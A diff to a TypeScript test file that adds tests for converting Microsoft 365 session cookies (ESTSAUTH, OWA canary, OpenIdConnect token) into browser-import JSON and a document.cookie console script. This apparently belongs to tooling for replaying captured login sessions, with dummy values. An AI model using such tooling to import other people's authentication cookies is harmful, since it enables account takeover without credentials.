@@ -6,6 +6,8 @@ import {
   filterMicrosoftRelatedCookies,
   cookieToSetUrl,
   cookiesToNetscape,
+  cookiesToBrowserImportJson,
+  cookiesToConsoleScript,
 } from '../shared/cookieFormat';
 
 test('parse semicolon header', () => {
@@ -107,4 +109,56 @@ test('cookiesToNetscape skips entries with no domain', () => {
   const dataLines = text.split('\n').filter(l => l && !l.startsWith('#'));
   assert.equal(dataLines.length, 1);
   assert.ok(dataLines[0].endsWith('\tok\tv'));
+});
+
+test('cookiesToBrowserImportJson preserves browser import metadata', () => {
+  const text = cookiesToBrowserImportJson([
+    {
+      name: 'ESTSAUTH',
+      value: 'abc123',
+      domain: '.login.microsoftonline.com',
+      path: '/',
+      secure: true,
+      expirationDate: 1893456000,
+    },
+    {
+      name: 'X-OWA-CANARY',
+      value: 'def456',
+      domain: 'outlook.office.com',
+      path: '/mail',
+      secure: true,
+    },
+  ]);
+  const parsed = JSON.parse(text) as Array<Record<string, unknown>>;
+  assert.equal(parsed.length, 2);
+  assert.equal(parsed[0].domain, '.login.microsoftonline.com');
+  assert.equal(parsed[0].hostOnly, false);
+  assert.equal(parsed[0].httpOnly, true);
+  assert.equal(parsed[0].sameSite, 'no_restriction');
+  assert.equal(parsed[0].session, false);
+  assert.equal(parsed[1].domain, 'outlook.office.com');
+  assert.equal(parsed[1].hostOnly, true);
+  assert.equal(parsed[1].session, true);
+});
+
+test('cookiesToConsoleScript warns for HttpOnly and domain mismatch constraints', () => {
+  const script = cookiesToConsoleScript([
+    {
+      name: 'ESTSAUTH',
+      value: 'abc123',
+      domain: '.login.microsoftonline.com',
+      path: '/',
+      secure: true,
+    },
+    {
+      name: 'OpenIdConnect.token.v1',
+      value: 'def456',
+      domain: '.outlook.office.com',
+      path: '/',
+      secure: true,
+    },
+  ]);
+  assert.match(script, /HttpOnly cookies with a browser cookie editor\/importer/);
+  assert.match(script, /domain mismatch/);
+  assert.match(script, /document\.cookie = line/);
 });
